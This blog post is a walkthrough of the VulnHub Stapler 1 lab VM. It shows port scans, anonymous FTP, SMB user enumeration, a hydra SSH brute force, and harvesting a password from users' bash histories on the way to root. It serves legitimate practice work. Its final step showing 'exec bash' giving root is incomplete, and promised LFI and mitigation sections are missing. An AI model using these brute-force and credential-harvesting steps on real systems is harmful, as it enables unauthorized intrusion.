---
layout: post
title:  "Stapler 1: Vulnhub Walkthrough"
date:   2018-08-03 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [g0tmi1k][2] and is part of a series called `Stapler`. Its graded as intermediate but I rank it as intermediate to hard. As this is purely for educational purposes I'll throw in spoilers now. As stated by the author there are various methods to root the box. Its got LFI, re-used credentials from an abandoned CMS and being an ld VM at time of writing we can throw some kernel exploits at it. To exploit this machine we'll need to chain two different exploits. At the end we'll also include some mitigation strategies. Without much further ado here we go. Word from the author:
```

```

<!--more-->
## Information Gathering
Find the port its running on if you don't have it;

`arp-scan -l -I eth0`

Next run masscan to quickly get the ports;;
```
root@marksmith:~/vulnhub/stapler/nmap# masscan -e eth0 -p1-65535,U:1-65535 192.168.109.141 --rate=1000 --router-mac 00:0c:29:5e:33:f4

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2020-02-11 13:04:58 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 192.168.109.141            
Discovered open port 666/tcp on 192.168.109.141            
Discovered open port 3306/tcp on 192.168.109.141          
Discovered open port 53/tcp on 192.168.109.141            
Discovered open port 139/tcp on 192.168.109.141            
Discovered open port 137/udp on 192.168.109.141            
Discovered open port 80/tcp on 192.168.109.141            
Discovered open port 22/tcp on 192.168.109.141            
Discovered open port 12380/tcp on 192.168.109.141
```
Then do an nmap scan;

```
# nmap -sC -sV -p 21,666,3306,53,139,137,80,22,12380 -oA nmap/initial -vvv 192.168.227.136
Nmap scan report for 192.168.227.136
Host is up, received arp-response (0.00038s latency).
Scanned at 2019-09-05 18:35:44 AEST for 181s
Not shown: 992 filtered ports
Reason: 992 no-responses
PORT     STATE  SERVICE     REASON         VERSION
20/tcp   closed ftp-data    reset ttl 64
21/tcp   open   ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp   open   ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (UbuntuLinux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
53/tcp   open   domain      syn-ack ttl 64 dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp   open   http        syn-ack ttl 64
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 568
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0;}
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|     </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/nice%20ports%2C/Tri%6Eity.txt%2ebak</code> was not found on this server.</p></body></html>
|   GetRequest, HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 533
|     <!doctype html><html><head><title>404 Not Found</title><style>
|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0;}
|     padding-left: 10px; }
|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
|     </style>
|_    </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/</code> was not found on this server.</p></body></html>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?       syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongPassword, IgnoreSigpipes, FoundRows, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1B7\x10\x7F;?\x08CpzK\x08+S\x07r\x13.M\x01
|_  Auth Plugin Name: 88
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.40%I=7%D=9/5%Time=5D70C8F9%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533\
SF:r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</title>
SF:<style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#33333
SF:3;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5em
SF:;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-he
SF:ight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20blac
SF:k;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}\
SF:ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monospa
SF:ce;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h1>
SF:<p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x20w
SF:as\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(HTTP
SF:Options,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2053
SF:3\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</titl
SF:e><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#333
SF:333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5
SF:em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-
SF:height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bl
SF:ack;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20
SF:}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monos
SF:pace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Found</h
SF:1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code>\x2
SF:0was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%r(Fo
SF:urOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x2
SF:0close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Lengt
SF:h:\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Fou
SF:nd</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:
SF:\x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:
SF:\x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;
SF:\x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20ins
SF:et\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x201
SF:0px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-fami
SF:ly:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20
SF:Found</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/ni
SF:ce%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\x20on\
SF:x20this\x20server\.</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.40%I=7%D=9/5%Time=5D70C8F3%P=x86_64-pc-linux-gnu%r(NULL
SF:,15A8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:9B:56:E3 (VMware)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 9h58m17s, deviation: 0s, median: 9h58m17s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64882/tcp): CLEAN (Timeout)
|   Check 2 (port 25295/tcp): CLEAN (Timeout)
|   Check 3 (port 45431/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40247/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2019-09-05T19:35:01+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  5 18:38:45 2019 -- 1 IP address (1 host up) scanned in 183.81 seconds

```
### ftp enumeration
We discover that port 21 has anonymous access:
```
ftp 192.168.227.136

220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|

user: anonymous
pass: gibeerish(anything will do)
ftp>get note
...
root@marksmith:~# cat /root/vulnhub/stapler/note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
![screenshot 5.png](/assets/images/posts/stapler-vulnhub-walkthrough/screenshot 4.png)

![screenshot 5.png](/assets/images/posts/stapler-vulnhub-walkthrough/screenshot 5.png)
It gives us possible users;

1. john
2. elly
3. harry

add these names to a file

### smb enumeration
Port 139 shows that smb may be running. We'll run enum4linux to enumerate this port:
`enum4linux -a 192.168.109.141`
This gives us some users;
```
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```
Create a user list using

`cat smbusers.txt | cut -d "\" -f 2 | cut -d " " -f 1`.

Looks like elly truly does exist on the box.

Use `hydra` to bruteforce ssh:

```
hydra L /root/vulnhub/stapler/realusers -P /root/vulnhub/stapler/realusers -e nsr -t 10 192.168.109.141 ssh
...
[STATUS] 210.67 tries/min, 632 tries in 00:0[3h, 236 to do in 00:02h, 10 active
[22][ssh] host: 192.168.109.141   login: SHayslett   password: SHayslett
[STATUS] 213.75 tries/min, 855 tries in 00:04h, 13 to do in 00:01h, 10 active
...
```
## Low Privilege shell
We log in with credentials;  
__user: SHayslett__  
__pass: SHayslett__  
```
root@marksmith:~/vulnhub/stapler# ssh SHayslett@192.168.109.141          
-----------------------------------------------------------------        
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.109.141's password:
Welcome back!


SHayslett@red:~$ ls
SHayslett@red:~$ pwd
/home/SHayslett


SHayslett@red:~$ ls /home/
AParnell  Eeth        JBare    LSolum   NATHAN      SHayslett
CCeaser   elly        jess     LSolum2  peter       SStroud
CJoo      ETollefson  JKanode  MBassin  RNunemaker  Taylor
Drew      IChadwick   JLipps   mel      Sam         www
DSwanger  jamie       kai      MFrei    SHAY        zoe
```
We navigate into the home directory and read the command history of all the users.
```
SHayslett@red:~$ cat /home/*/.bash_history
...
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
...
```
Within this long list we find the ssh credentials;
## Privilege Escalation

We log in as peter;  
__user: peter__  
__password: JZQuyIN5___  

```
SHayslett@red:~$ su - peter
Password:
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses ---

Aborting.
The function will be run again next time.  To prevent this, execute:
  touch ~/.zshrc
red% pwd
  /home/peter
red% sudo -l

  We trust you have received the usual lecture from the local System
  Administrator. It usually boils down to these three things:

      #1) Respect the privacy of others.
      #2) Think before you type.
      #3) With great power comes great responsibility.

  [sudo] password for peter:
  Matching Defaults entries for peter on red:
      lecture=always, env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User peter may run the following commands on red:
      (ALL : ALL) ALL
red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

```
We find ourselves in `peters` home directory which is zsh, with some restrictions. Looks like he can execute `(ALL : ALL) ALL` commands. He belongs to the sudo group. We break out the shell as follows.

```
red% exec bash
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
➜  ~ pwd
/root
➜  ~ cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```
We got our root flag.

[1]: https://www.vulnhub.com/entry/stapler-1,150/
[2]: https://twitter.com/@g0tmi1k
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
